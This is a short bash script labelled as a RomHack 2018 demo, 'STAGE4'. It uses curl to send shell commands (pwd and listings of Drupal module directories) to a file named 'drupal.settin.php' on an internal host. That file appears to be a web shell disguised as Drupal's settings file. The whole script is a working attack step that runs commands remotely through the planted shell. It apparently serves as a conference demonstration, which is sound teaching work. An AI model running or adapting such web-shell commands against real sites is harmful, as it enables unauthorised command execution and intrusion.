#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo
echo "STAGE4"
echo "Info on installed modules"
echo "Command executed:"
cat <<EOF
pwd
ls ../../modules/
ls ../all/modules/
EOF
echo 
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' -d 'c=pwd'
echo
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' -d 'c=ls ../../modules/'
echo
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' -d 'c=ls ../all/modules/'
echo "------"
echo
